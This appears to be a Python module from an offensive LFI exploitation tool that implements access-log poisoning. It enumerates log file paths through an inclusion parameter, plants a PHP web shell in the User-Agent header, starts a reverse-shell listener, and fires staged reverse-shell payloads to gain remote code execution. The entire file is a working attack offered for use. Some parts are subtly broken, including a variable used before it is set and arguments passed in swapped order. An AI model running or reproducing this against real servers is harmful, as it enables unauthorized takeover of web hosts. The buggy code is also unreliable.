"""Log Poison"""
import os
import threading

from src.utils.arguments import init_args
from src.httpreqs import request
from src.configs import config
from src.utils.colors import Colors
from src.utils.info import printFancyString
from src.utils.info import printInfo
from src.servers.LFIshell import start_listener

def exploit_log_poison(
    ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post
):
    args  = init_args()
    if args['f']:
        return

    maliciousHeaders = args['httpheaders'].copy()
    maliciousHeaders["User-Agent"] = "<?php system($_GET['c']); ?>"
    lastPrintedStringLen = 0

    if not os.path.exists(
        args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt"
    ):
        print(
            Colors().red("[-]")
            + " Cannot locate '"
            + args['scriptDirectory']
            + os.sep
            + "src/wordlists/http_access_log.txt"
            + "' file that contains log locations",
            flush = True
        )
        return

    with open(args['scriptDirectory'] + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
        print(
            Colors().green("[i]")
            + " Enumerating file system to discover access log location...", flush = True
        )
        lines = f.readlines()
        for line in lines:
            line = line.strip()

            lastPrintedStringLen = printFancyString(
                "Checking: " + line, lastPrintedStringLen
            )

            if post:
                res, _ = request.REQUEST(
                    url,
                    args['httpheaders'],
                    post.replace(config.tempArg, line),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )
            else:
                res, _ = request.REQUEST(
                    url.replace(config.tempArg, line),
                    args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

            if args['httpheaders']["User-Agent"] in res.text:
                lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                print(
                    "\n"
                    + Colors().green("[.]")
                    + " Located canary in target's access log at '"
                    + line
                    + "'",
                    flush = True
                )

                print(
                    Colors().green("[.]")
                    + " Poisoning access log with the shell code... ",
                    flush = True
                )

                # First start the reverse listener
                thread = threading.Thread(target=start_listener, args=(args.lport,))
                thread.start()

                # Upload web shell inside log
                if post:
                    request.REQUEST(
                        url,
                        maliciousHeaders,
                        post.replace(config.tempArg, line),
                        config.proxies,
                        "",
                        "",
                        exploit=True,
                    )
                else:
                    res, _ = request.REQUEST(
                        url.replace(config.tempArg, line),
                        maliciousHeaders,
                        post,
                        config.proxies,
                        "",
                        "",
                        exploit=True,
                    )

                # Exploit to RCE
                if config.tempArg in url:
                    if "?" in url:
                        # Append ampersand as the Nth  parameter value
                        exploitUrl = (
                            url.replace(config.tempArg, line) + "&c=" + testPayload
                        )
                    else:
                        # Append questionmark as first parameter value
                        exploitUrl = (
                            url.replace(config.tempArg, line) + "?c=" + testPayload
                        )

                    res, _ = request.REQUEST(
                    exploitUrl,
                    args.httpheaders,
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

                elif config.tempArg in post:
                    exploitPost = post + "&c=" + payloadStageOne

                    res, _ = request.REQUEST(
                    exploitUrl,
                    args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                )

                if testString in res.text:
                    printInfo(ip, port, "bash", "access log poisoning")

                    if config.tempArg in post:
                        print(
                            Colors().green("[.]")
                            + " Executing stage 1 of the revshell payload...",
                            flush = True
                        )
                        request.REQUEST(
                            url,
                            args['httpheaders'],
                            exploitPost,
                            config.proxies,
                            "",
                            "",
                            exploit=True,
                        )

                        if payloadStageTwo != "":
                            print(
                                Colors().green("[.]")
                                + " Executing stage 2 of the revshell payload...",
                                flush = True
                            )
                            request.REQUEST(
                                url,
                                exploitPost,
                                args['httpheaders'],
                                config.proxies,
                                "",
                                "",
                                exploit=True,
                            )
                            exploitPost = url + "&c=" + payloadStageTwo
                        break

                    elif config.tempArg in url:
                        exploitUrl = (
                            url.replace(config.tempArg, line) + "&c=" + payloadStageOne
                        )
                        print(
                            Colors().green("[.]")
                            + " Executing stage 1 of the revshell payload...",
                            flush = True
                        )
                        request.REQUEST(
                            exploitUrl,
                            args['httpheaders'],
                            post,
                            config.proxies,
                            "",
                            "",
                            exploit=True,
                        )

                        if payloadStageTwo != "":
                            exploitUrl = (
                                url.replace(config.tempArg, line)
                                + "&c="
                                + payloadStageTwo
                            )
                            print(
                                Colors().green("[.]")
                                + " Executing stage 2 of the revshell payload. Check your listener...",
                                flush = True
                            )
                            request.REQUEST(
                                exploitUrl,
                                args['httpheaders'],
                                post,
                                config.proxies,
                                "",
                                "",
                                exploit=True,
                            )
                        
                        # Join the listener thread, with 10 second timeout in case deadlock, unexpected expections or other errors occur in the meantime
                        # This will make sure that execution continues no matter the occurring issues in the thread
                        thread.join(timeout=10)
                        break
        else:
            # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
            if args['verbose']:
                printFancyString(
                    Colors().red("[-]")
                    + " Couldn't locate target server's access log to poison/log is not readable.\n",
                    lastPrintedStringLen,
                )
            else:
                printFancyString("", lastPrintedStringLen)
